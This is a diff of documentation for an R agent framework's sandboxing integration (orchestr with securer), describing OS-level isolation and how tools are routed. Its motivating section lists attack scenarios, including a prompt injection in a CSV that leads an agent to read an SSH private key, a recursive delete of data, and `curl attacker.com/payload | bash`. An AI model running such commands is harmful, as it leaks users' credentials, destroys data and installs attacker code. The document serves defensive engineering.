@@ -1,30 +1,28 @@
 # Secure Execution with securer
 
-## Why Sandboxed Execution?
+## Why sandboxed execution?
 
-When an LLM agent generates and executes R code, it is running arbitrary
-code on your machine. This is fundamentally different from a human
-writing code in an interactive session, because the human applies
-judgment about what is safe to run. The model does not have that
-judgment – and worse, it can be manipulated.
+When an LLM agent generates and executes R code, it runs arbitrary code
+on your machine. A human applies judgment about what is safe to run. The
+model does not, and worse, it can be manipulated.
 
-Consider these concrete attack scenarios:
+Consider these attack scenarios:
 
-- **Data exfiltration**: A prompt injection in a user-uploaded CSV
-  causes the agent to run `readLines("~/.ssh/id_rsa")` and include the
-  contents in its response. The user’s private key is now in the LLM
-  provider’s logs.
+- Data exfiltration: A prompt injection in a user-uploaded CSV causes
+  the agent to run `readLines("~/.ssh/id_rsa")` and include the contents
+  in its response. The user’s private key is now in the LLM provider’s
+  logs.
 
-- **Filesystem destruction**: The agent encounters an error and decides
-  to “clean up” by running `unlink("/data/reports", recursive = TRUE)`.
-  A momentary hallucination just deleted your production data.
+- Filesystem destruction: The agent encounters an error and decides to
+  “clean up” by running `unlink("/data/reports", recursive = TRUE)`. A
+  momentary hallucination just deleted your production data.
 
-- **Credential theft**: The model runs
+- Credential theft: The model runs
   [`Sys.getenv()`](https://rdrr.io/r/base/Sys.getenv.html) to “debug” a
-  connection issue, exposing every environment variable – API keys,
-  database passwords, cloud credentials – in its output.
+  connection issue, exposing every environment variable (API keys,
+  database passwords, cloud credentials) in its output.
 
-- **Lateral movement**: The agent calls
+- Lateral movement: The agent calls
   `system("curl attacker.com/payload | bash")` to install a “helpful
   package” that a prompt injection suggested.
 
@@ -36,7 +34,7 @@ network, or system resources beyond what you explicitly allow.
 
 orchestr integrates with securer through the `secure = TRUE` flag on
 [`agent()`](https://ian-flores.github.io/orchestr/reference/Agent.md).
-The interaction between orchestr and securer looks like this:
+Here is how orchestr and securer interact:
 
      +------------------+       tool call       +------------------+
      |    orchestr      | -------------------> |     securer       |
@@ -61,12 +59,12 @@ blocks it.
 install.packages(c("securer", "orchestr"))
 ```
 
-## Creating a Secure Agent
+## Creating a secure agent
 
 The `secure = TRUE` and `sandbox = TRUE` flags on
 [`agent()`](https://ian-flores.github.io/orchestr/reference/Agent.md)
 tell orchestr to route tool execution through a securer `SecureSession`.
-You define tools as usual – the sandboxing is transparent to the tool
+You define tools as usual; the sandboxing is transparent to the tool
 implementation.
 
 ``` r
@@ -106,38 +104,37 @@ cat(result)
 secure_agent$close()
 ```
 
-## What the Sandbox Restricts
+## What the sandbox restricts
 
 When `sandbox = TRUE`, the child R process runs inside an OS sandbox:
 
-- **macOS**: Seatbelt profile via `sandbox-exec`. Blocks filesystem
-  writes outside temp, network access, and process spawning.
-- **Linux**: Bubblewrap (`bwrap`) namespace isolation. Blocks
-  filesystem, network, and IPC outside the sandbox.
-- **Windows**: Environment isolation (clean HOME, TMPDIR, R_LIBS_USER).
-  No filesystem or network restrictions without admin privileges.
+- macOS: Seatbelt profile via `sandbox-exec`. Blocks filesystem writes
+  outside temp, network access, and process spawning.
+- Linux: Bubblewrap (`bwrap`) namespace isolation. Blocks filesystem,
+  network, and IPC outside the sandbox.
+- Windows: Environment isolation (clean HOME, TMPDIR, R_LIBS_USER). No
+  filesystem or network restrictions without admin privileges.
 
-The sandbox operates at the OS level, which means it catches everything
-– including [`system()`](https://rdrr.io/r/base/system.html) calls,
-compiled code, and any R package that attempts forbidden operations.
-This is strictly stronger than R-level sandboxing approaches that rely
-on function blacklists, because it is enforced by the kernel.
+The sandbox operates at the OS level, catching
+[`system()`](https://rdrr.io/r/base/system.html) calls, compiled code,
+and any R package that attempts forbidden operations. Kernel enforcement
+is strictly stronger than R-level sandboxing that relies on function
+blacklists.
 
-## Mixing Secure and Regular Tools
+## Mixing secure and regular tools
 
-In practice, not every tool needs to run in a sandbox. An agent might
-need both a sandboxed code execution tool (untrusted, LLM-generated
-code) and a regular API lookup tool (trusted code that you wrote).
-orchestr supports this by distinguishing
+Not every tool needs a sandbox. An agent might need both a sandboxed
+code execution tool (untrusted, LLM-generated code) and a regular API
+lookup tool (trusted code that you wrote). orchestr tells
 [`securer_tool()`](https://ian-flores.github.io/securer/reference/securer_tool.html)
-instances from regular
+instances apart from regular
 [`ellmer::tool()`](https://ellmer.tidyverse.org/reference/tool.html)
 instances.
 
-When an agent has both types, securer tools are routed to the sandboxed
-child process while regular tools execute in the parent process. This
-gives you the best of both worlds: untrusted code is isolated, trusted
-code has full access to the network and filesystem.
+When an agent has both types, securer tools run in the sandboxed child
+process while regular tools execute in the parent process. Untrusted
+code stays isolated; trusted code keeps full access to the network and
+filesystem.
 
 ``` r
 # Regular tool -- runs in the parent process, no sandbox
@@ -168,13 +165,12 @@ result <- hybrid_agent$invoke("What is 2^10? Also, what's the weather in London?
 hybrid_agent$close()
 ```
 
-## Using Secure Agents in Graphs
+## Using secure agents in graphs
 
-Secure agents work identically to regular agents inside any graph type.
-The sandboxing is handled at the tool execution layer, so the graph
-runtime does not need to know or care whether an agent is sandboxed.
-This means you can mix secure and non-secure agents in the same pipeline
-or supervisor graph.
+Secure agents work the same as regular agents inside any graph type.
+Sandboxing operates at the tool execution layer, so the graph runtime is
+unaware of it. You can mix secure and non-secure agents in the same
+pipeline or supervisor graph.
 
 ``` r
 analyst <- agent("analyst",
@@ -207,17 +203,17 @@ result <- graph$invoke(
 )
 ```
 
-## Next Steps
+## Next steps
 
-- **[Getting
-  Started](https://ian-flores.github.io/orchestr/articles/quickstart.md)**
-  – single-agent basics and provider setup
-- **[Multi-Agent
-  Workflows](https://ian-flores.github.io/orchestr/articles/multi-agent.md)**
-  – pipelines and supervisors
-- **[Traced
-  Workflows](https://ian-flores.github.io/orchestr/articles/tracing.md)**
-  – observability with securetrace
-- **[Governed
-  Agent](https://ian-flores.github.io/orchestr/articles/governed-agent.md)**
-  – the full 7-package stack
+- [Getting
+  started](https://ian-flores.github.io/orchestr/articles/quickstart.md):
+  single-agent basics and provider setup
+- [Multi-agent
+  workflows](https://ian-flores.github.io/orchestr/articles/multi-agent.md):
+  pipelines and supervisors
+- [Traced
+  workflows](https://ian-flores.github.io/orchestr/articles/tracing.md):
+  observability with securetrace
+- [Governed
+  agent](https://ian-flores.github.io/orchestr/articles/governed-agent.md):
+  the full 7-package stack
